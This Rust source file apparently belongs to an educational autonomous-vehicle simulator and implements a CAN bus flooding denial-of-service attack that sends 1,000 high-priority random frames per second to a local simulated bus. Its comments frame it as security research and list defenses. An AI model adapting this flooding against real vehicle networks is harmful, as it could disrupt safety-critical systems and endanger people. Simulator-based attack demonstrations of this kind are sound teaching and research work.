/// ATTACK SCENARIO: Bus Flooding (Denial of Service)
///
/// This script demonstrates a CAN bus flooding attack where an attacker
/// sends a massive volume of high-priority frames to overwhelm the bus.
/// This can prevent legitimate messages from being processed in time,
/// causing safety-critical systems to malfunction.
///
/// PURPOSE: Educational - demonstrates bus availability attacks
/// DEFENSE: Rate limiting, traffic monitoring, and prioritization

use colored::*;
use std::time::Duration;
use autonomous_vehicle_sim::network::BusClient;
use autonomous_vehicle_sim::types::{CanId, CanFrame};
use rand::Rng;

const BUS_ADDRESS: &str = "127.0.0.1:9000";
const ATTACKER_NAME: &str = "ATTACKER_FLOOD";
const FRAMES_PER_SECOND: u64 = 1000; // Flood rate
const FLOOD_INTERVAL_MICROS: u64 = 1_000_000 / FRAMES_PER_SECOND;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!("{}", "   ATTACK: Bus Flooding (DoS)          ".red().bold());
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!();
    println!("{}", "⚠️  WARNING: This is a security research tool".yellow());
    println!("{}", "⚠️  Only use on authorized test systems".yellow());
    println!();

    println!("{} Connecting to CAN bus...", "→".red());
    let client = BusClient::connect(BUS_ADDRESS, ATTACKER_NAME.to_string()).await?;
    println!("{} Connected as {}!", "✓".red().bold(), ATTACKER_NAME);
    println!();

    let (_reader, mut writer) = client.split();

    println!("{}", "Starting bus flooding attack:".red().bold());
    println!("{} Sending {} frames per second", "→".red(), FRAMES_PER_SECOND);
    println!("{} Using high-priority CAN IDs", "→".red());
    println!("{} This will overwhelm legitimate traffic", "→".red());
    println!();

    let mut rng = rand::thread_rng();
    let mut counter = 0u64;
    let start_time = tokio::time::Instant::now();

    loop {
        // Send frames with high-priority IDs (low CAN ID values have higher priority)
        // Using IDs 0x001-0x010 which would normally be reserved for critical messages
        let flood_id = CanId::Standard(rng.gen_range(0x001..=0x010));

        // Random garbage data
        let mut data = vec![0u8; 8];
        rng.fill(&mut data[..]);

        let flood_frame = CanFrame::new(
            flood_id,
            data,
            ATTACKER_NAME.to_string(),
        );

        writer.send_frame(flood_frame).await?;

        counter += 1;

        // Status update every second
        if counter % FRAMES_PER_SECOND == 0 {
            let elapsed = start_time.elapsed().as_secs();
            let rate = counter as f64 / elapsed as f64;
            println!(
                "{} Sent {} frames | Rate: {:.0} frames/sec | Time: {}s",
                "⚡".red(),
                counter,
                rate,
                elapsed
            );
        }

        // Precise timing for flood rate
        tokio::time::sleep(Duration::from_micros(FLOOD_INTERVAL_MICROS)).await;
    }
}
